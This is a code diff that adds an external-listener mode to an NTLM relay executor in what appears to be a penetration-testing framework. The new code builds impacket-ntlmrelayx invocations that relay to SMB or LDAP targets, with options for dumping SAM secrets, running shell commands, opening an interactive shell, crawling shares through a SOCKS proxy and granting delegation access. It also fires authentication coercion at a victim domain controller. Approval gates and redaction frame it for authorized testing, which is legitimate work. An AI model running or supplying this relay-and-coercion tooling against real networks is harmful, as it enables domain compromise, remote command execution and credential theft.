@@ -48,6 +48,7 @@ UNVERIFIED ASSUMPTIONS (pin in-lab, mirroring adcs_esc1.py):
 from __future__ import annotations
 
 import re
+import shlex
 from pathlib import Path
 from typing import Any, Optional
 
@@ -63,6 +64,70 @@ from .coercion import COERCION_METHODS, coercion_trigger_argv
 RELAY_MODES = ("smb_sam", "ldap_rbcd")
 # Class-wide verified_recipe does not prove any individual mode.
 MODE_PROVEN = {"smb_sam": False, "ldap_rbcd": False}
+
+
+def external_listener_spec() -> ParamSpec:
+    return ParamSpec(
+        name="external_listener", kind="free", recommended="", required=False,
+        description="Operator-run ntlmrelayx endpoint (IP or IP:port). Empty uses "
+                    "the in-process listener on NTLM-RELAY.",
+        rationale="Dispatch coercion to the operator's listener; the operator holds the result.")
+
+
+def external_listener_argv(relay_target, mode, lootdir, endpoint, *, action="", shell_cmd=""):
+    """Exact operator invocation; no listener is started by this helper."""
+    if mode == "ldap_rbcd":
+        argv = ["impacket-ntlmrelayx", "-t", f"ldap://{relay_target}",
+                "--delegate-access", "-smb2support"]
+    else:
+        argv = ["impacket-ntlmrelayx", "-t", f"smb://{relay_target}", "-smb2support"]
+        if action == "shell":
+            argv += ["-c", shell_cmd] if shell_cmd else ["-i"]
+        elif action == "crawl":
+            argv += ["-socks"]
+        else:
+            argv += ["-l", str(lootdir)]
+    argv += ["--no-http-server", "--no-wcf-server", "--no-raw-server",
+             "--no-rpc-server", "--no-winrm-server", "--no-mssql-server", "--no-rdp-server"]
+    host, sep, port = endpoint.rpartition(":")
+    if host and sep and port.isdecimal():
+        argv += ["--smb-port", port]
+    return argv
+
+
+def external_relay_preview(ctx, relay_target, mode, victim, endpoint, *,
+                           method="auto", action="", shell_cmd="") -> list[str]:
+    listener = external_listener_argv(
+        relay_target, mode, Path(ctx.output_dir) / "loot", endpoint,
+        action=action, shell_cmd=shell_cmd)
+    trigger = coercion_trigger_argv(method, victim, endpoint, ctx.config)
+    preview = [f"Run on operator listener {endpoint}: {shlex.join(listener)}",
+               "Fire coercion: " + shlex.join(redact_argv(trigger)),
+               "Operator ntlmrelayx performs the action and holds the result; dispatch is not proof."]
+    if action == "crawl":
+        preview.append("Then crawl shares through that SOCKS proxy with SHARE-LOOT and its secrets finder.")
+    return preview
+
+
+def dispatch_external_coercion(ctx, victim, endpoint, method="auto"):
+    """Fire once without starting, reading or stopping an in-process listener.
+
+    Tool output stays runtime-only, including errors; only a fixed classification
+    and public identifiers can reach the receipt.
+    """
+    Path(ctx.output_dir).mkdir(parents=True, exist_ok=True)
+    argv = coercion_trigger_argv(method, victim, endpoint, ctx.config)
+    res = ctx.runner.run(argv, timeout=ctx.config.tool_timeout_s, cwd=str(ctx.output_dir))
+    fired = not (res.timed_out or res.error)
+    steps = [StepRecord(name="external_listener", ok=True, note=f"Operator endpoint {endpoint}"),
+             StepRecord(name="coerce_trigger", ok=fired, argv_display=redact_argv(argv),
+                        returncode=res.returncode, note=f"method={method}")]
+    return steps, "coercion_dispatched_external" if fired else "coerce_not_fired"
+
+
+def external_dispatch_predicate(endpoint):
+    return (f"Coercion was fired toward the operator's external listener {endpoint}; "
+            "the operator's ntlmrelayx performs the action and holds the result")
 
 # ---- UNVERIFIED output / artifact markers (see module docstring) --------------
 _RE_AUTH_LANDED = re.compile(
@@ -157,6 +222,7 @@ class NTLMRelayExecutor(ValidationExecutor):
                 rationale="Coercer multiplexer by default (research 3.3).",
                 choices=list(COERCION_METHODS),
             ),
+            external_listener_spec(),
         ]
 
     def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
@@ -170,6 +236,10 @@ class NTLMRelayExecutor(ValidationExecutor):
         mode = v.get("mode") or "smb_sam"
         listener = v.get("listener_host") or "<local>"
         relay = v["relay_target"]
+        if v.get("external_listener"):
+            return external_relay_preview(
+                ctx, relay, mode, v.get("victim_dc") or relay,
+                v["external_listener"], method=v.get("method") or "auto")
         if mode == "ldap_rbcd":
             return [
                 f"start ntlmrelayx -t ldap://{relay} --delegate-access on {listener}",
@@ -232,6 +302,13 @@ class NTLMRelayExecutor(ValidationExecutor):
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "relay"
+
+        if v.get("external_listener"):
+            steps, classification = dispatch_external_coercion(
+                ctx, victim_dc, v["external_listener"], method)
+            terminal_fact = self._terminal_fact(
+                cfg, relay_target, mode, classification, v["external_listener"])
+            return self._artifact(steps, gate, mutation, terminal_fact, False, [classification])
 
         # 1) start the ntlmrelayx listener (non-blocking). UNVERIFIED invocation.
         if mode == "ldap_rbcd":
@@ -304,9 +381,10 @@ class NTLMRelayExecutor(ValidationExecutor):
                               classification == "action_succeeded", errors)
 
     @staticmethod
-    def _terminal_fact(cfg, relay_target, mode, classification):
+    def _terminal_fact(cfg, relay_target, mode, classification, endpoint=""):
         # Only public identifiers and fixed outcome strings enter the proof.
         predicates = {
+            "coercion_dispatched_external": external_dispatch_predicate(endpoint),
             "coerce_not_fired": "coercion trigger timed out or failed to run",
             "no_auth_landed": "no relayed session observed within the poll window (inconclusive)",
             "action_denied": "relayed session observed but the requested action did not succeed",
